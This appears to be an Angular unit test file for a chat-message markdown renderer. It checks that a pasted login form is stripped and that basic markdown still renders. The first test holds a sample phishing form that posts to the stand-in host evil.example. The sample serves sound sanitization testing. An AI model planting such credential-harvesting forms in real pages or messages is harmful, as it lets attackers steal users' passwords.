import { TestBed } from '@angular/core/testing';
import { PkMarkdown } from '@prompt-kit/markdown/pk-markdown';

describe('message markdown', () => {
  async function render(content: string): Promise<HTMLElement> {
    await TestBed.configureTestingModule({ imports: [PkMarkdown] }).compileComponents();
    const fixture = TestBed.createComponent(PkMarkdown);
    fixture.componentRef.setInput('content', content);
    await fixture.whenStable();
    return fixture.nativeElement as HTMLElement;
  }

  it('drops a login form someone pastes into a message', async () => {
    const el = await render(
      'hi <form action="https://evil.example"><input name="p"><button>Login</button></form>',
    );

    expect(el.querySelector('form')).toBeNull();
    expect(el.querySelector('button')).toBeNull();
    expect(el.querySelector('[action]')).toBeNull();
    expect(el.textContent).toContain('hi');
  });

  it('still renders markdown', async () => {
    const el = await render('**bold** and `code`');

    expect(el.querySelector('strong')?.textContent).toBe('bold');
  });
});
